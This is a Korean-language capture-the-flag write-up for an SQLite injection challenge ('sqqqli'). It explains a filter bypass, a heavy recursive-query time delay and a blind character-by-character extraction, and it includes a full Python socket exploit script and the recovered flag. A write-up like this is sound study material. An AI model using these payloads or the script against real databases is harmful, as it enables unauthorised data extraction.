# sqqqli write up

```py
# app.py
q = input('Query > ').lower()
if('lo' not in q):
    try:
        cur.execute(q)
        print('Done!')
    except:
        pass
else:
    print("sorry i can't allow that :'(")

conn.commit()
conn.close()
os.remove(dbpath)
```
문제에서 입력값을 lower(소문자)로 바꾼 후 입력값에 'lo'라는 문자열이 들어가 있는지 검사합니다.
검사를 통과하면 예외처리문으로 이동하여 쿼리를 실행시키고 쿼리가 실행중 오류가 발생하면 예외처리로 인해 pass 됩니다.
만약 아무런 오류가 발생하지 않으면 'Done!'이라는 문자열을 출력시킵니다.

먼저, 입력값에 대하여 특정 문자 빼고는 아무런 필터링 검사가 이루어지지 않기 때문에 sql injection이 발생합니다.
또한 쿼리의 실행결과를 알려주지 않고 정상적으로 실행이 됬는지 여부만 판단해서 알려주기 때문에 Error based sql injection 또는 Time based sql injection 공격 기법을 예측해 볼 수 있습니다.

mysql, mssql, oracle 과 같은 DBMS 에서는 Error을 인위적으로 발생시킬 수 있는 함수가 존재하여 Error based sql injection을 수행할 수 있지만,
sqlite 에서는 이와 같은 Response-Based SQL injection 기법을 아무리 찾아봐도 알아낼 수 없었기 때문에 Time based sql injection 기법을 생각해 보았습니다.

sqlite 에서는 sleep, benchmark 와 같은 딜레이 함수가 따로 존재하지 않기 때문에 헤비 쿼리 (많은 연산이 필요한 쿼리문을 만들어 시간을 강제로 지연시키는 쿼리)를 이용한 공격방식을 생각해보았고, 아래와 같은 쿼리문을 발견하였습니다.

    (WITH RECURSIVE r(i) AS ( VALUES(0) UNION ALL SELECT i FROM r LIMIT 6000000 ) SELECT i FROM r WHERE i = 1)

반복문을 이용해서 많은양의 데이터를 집어넣게 하는 쿼리문을 사용하였습니다, randomblob 함수를 사용하려했지만 'lo' 필터링때문에 동작되지 않아 찾아낸 헤비쿼리문 입니다.
위 헤비쿼리문이 돌아가는 시간은 약 4초이기 때문에 Time based sql injection을 수행할 수 있습니다.
기본적으로 flag 테이블의 flag 컬럼에 flag 값이 존재하기 때문에 이를 일일히 비교해서 찾아낼 수 있는 쿼리문과 위의 헤비쿼리문을 조합해서 payload를 만들었습니다.
```sql
select * from flag where unicode(substr(flag,1,1))=87 or (WITH RECURSIVE r(i) AS ( VALUES(0) UNION ALL SELECT i FROM r LIMIT 6000000 ) SELECT i FROM r WHERE i = 1)    
```
unicode 함수를 사용한 이유는 lower 함수로 인해 소문자로 값이 비교되기 때문에 flag 값에 대문자가 존재할 것을 고려해서 아스키코드로 변환해 값을 비교하였습니다.
이렇게해서 만들어낸 payload를 자동화 시켜서 확인해보면 아래와 같은 최종 익스플로잇 코드가 완성됩니다.
```py
import socket
import time

ascii_table = [65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 125, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57]
flag = ""

def start_exploit(host="110.10.147.146", port=9020):
    global flag
    for j in range(1, 33):
        for i in ascii_table:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            sql_payload = f"select * from flag where unicode(substr(flag,{j},1))={i} or (WITH RECURSIVE r(i) AS ( VALUES(0) UNION ALL SELECT i FROM r LIMIT 6000000 ) SELECT i FROM r WHERE i = 1)"

            s.sendall(sql_payload.encode())
            s.shutdown(socket.SHUT_WR)

            result = ""

            while True:
                data = s.recv(1024)
                if (not data):
                    break
                result = data.decode()
            
            if ("Done!" in result):
                flag += chr(i)
                print(f"[*] find flag : {flag}, now flag length : {j}")
                break
            else:
                print(f"[*] success send payload ascii is : '{chr(i)}', now check flag length : {j}")

            s.close()

if __name__ == '__main__':
  start_exploit()
```
약 10~20분정도가 걸리고 나서야 flag를 획득할 수 있었습니다.
```flag : WACon{sql-is-fun-fun-fun!!!!!}```